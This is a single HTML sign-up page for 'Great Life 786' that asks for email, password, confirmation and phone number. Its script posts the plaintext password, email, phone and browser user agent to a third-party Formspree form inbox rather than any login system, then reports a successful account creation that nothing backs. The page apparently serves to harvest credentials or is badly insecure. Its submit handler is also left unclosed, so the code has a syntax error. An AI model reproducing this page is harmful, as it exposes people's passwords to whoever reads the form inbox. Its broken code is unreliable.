<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Great Life 786 - Sign Up</title>
    <style>
        :root { --green: #00ff88; --bg: #05100a; }
        body { background: var(--bg); color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .form-card { background: rgba(255, 255, 255, 0.05); padding: 30px; border-radius: 20px; border: 1px solid var(--green); width: 100%; max-width: 400px; box-shadow: 0 0 15px rgba(0, 255, 136, 0.2); }
        h2 { color: var(--green); text-align: center; margin: 0; }
        p { text-align: center; margin-bottom: 20px; opacity: 0.8; }
        input, select { width: 100%; padding: 12px; margin: 8px 0; background: rgba(0,0,0,0.3); border: 1px solid var(--green); color: white; border-radius: 8px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: var(--green); border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .link { text-align: center; margin-top: 15px; font-size: 14px; }
        .link a { color: var(--green); text-decoration: none; }
    </style>
</head>
<body>

<div class="form-card">
    <h2>Sign Up</h2>
    <p>Great Life 786</p>
    
    <form id="signupForm">
        <input type="email" id="email" placeholder="Email Address" required>
        <input type="password" id="pass" placeholder="Password" required>
        <input type="password" id="cpass" placeholder="Confirm Password" required>
        
        <div style="display: flex; gap: 5px;">
            <select id="country" style="width: 30%;">
                <option value="+92">+92</option>
                <option value="+1">+1</option>
            </select>
            <input type="number" id="phone" placeholder="Mobile Number" required style="width: 70%;">
        </div>
        
        <button type="submit">Sign Up</button>
    </form>

    <div class="link">
        Already have an account? <a href="signin.html">Sign In</a>
    </div>
</div>

<script>
    document.getElementById('signupForm').onsubmit = async (e) => {
        e.preventDefault();
        
        // 1.
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        const cpass = document.getElementById('cpass').value;
        const phone = document.getElementById('country').value + document.getElementById('phone').value;
        
        // 2.
        if (!email.includes('@')) { alert("Please enter a valid email!"); return; }
        if (pass !== cpass) { alert("Passwords do not match!"); return; }

        // 3.
        const deviceInfo = navigator.userAgent;

        // 4.
        const payload = { email, pass, phone, deviceInfo };
        
        console.log("Sending to server:", payload);
        alert("Account creation request sent from: " + deviceInfo.substring(0, 30) + "...");
        
        await fetch('https://formspree.io/f/xkodnrde', {
  method: 'POST',
  body: JSON.stringify(payload),
  headers: {
    'Accept': 'application/json',
    'Content-Type': 'application/json'
  }
});
alert("Account Created Successfully!");

</script>
</body>
</html>
